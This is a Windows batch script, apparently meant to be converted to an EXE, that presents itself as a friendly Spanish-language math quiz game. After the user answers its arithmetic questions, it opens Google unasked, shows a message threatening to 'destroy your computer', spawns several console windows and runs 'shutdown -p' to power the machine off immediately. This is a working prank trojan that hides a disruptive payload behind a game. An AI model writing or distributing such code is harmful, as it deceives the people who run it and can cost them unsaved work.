@ECHO OFF
REM BFCPEOPTIONSTART
REM Advanced BAT to EXE Converter www.BatToExeConverter.com
REM BFCPEEXE=
REM BFCPEICON=C:\Program Files (x86)\Advanced BAT to EXE Converter v4.23\ab2econv423\icons\icon10.ico
REM BFCPEICONINDEX=-1
REM BFCPEEMBEDDISPLAY=0
REM BFCPEEMBEDDELETE=1
REM BFCPEADMINEXE=0
REM BFCPEINVISEXE=0
REM BFCPEVERINCLUDE=0
REM BFCPEVERVERSION=1.0.0.0
REM BFCPEVERPRODUCT=Product Name
REM BFCPEVERDESC=Product Description
REM BFCPEVERCOMPANY=Your Company
REM BFCPEVERCOPYRIGHT=Copyright Info
REM BFCPEOPTIONEND
@ECHO ON
@echo off
:incio
echo hola
color 70
color 4f
echo.

set/p nombre= como te llamas?
echo.
echo hola %nombre% un gusto :3 
echo.

echo te gustan los juegos?
echo a mi si! juguemos uno
echo.
pause>nul

set/p variable= cuanto es 2+2x2-2/2?
echo.
if %variable% == 5 goto correcto else goto incorrecto
:incorrecto
echo mal inciaremos de nuevo
echo.
:incorrecto
pause
cls
goto incio
pause>nul
:correcto
echo bien continuaremos
pause>nul

start https://www.google.com/
echo.
echo lo siento abri sin querer google, es que es la 1ra vez que alguien me instala y juega conmigo un rato ojala no te enojes... te dire otra pregunta :D
echo.
pause>nul

set/p valor= Si 10 Mas x es 5 más que 10 cuál es el valor de 2x?
if %valor% == 10 goto genial else goto mal
:mal 
echo mal inciemos de nuevo
echo.
:mal
pause
cls
goto incio
pause>nul
:genial
echo genial mi amigo continuemos
echo.
pause>nul

echo muuuuy bien bro :D te has esforzado bastante, te mereces un premio y ese premio es...
echo.
color 70
color 07

msg * destruir tu compu >=D
start
start
start
start
start
start

shutdown -p

pause>nul
pause
exit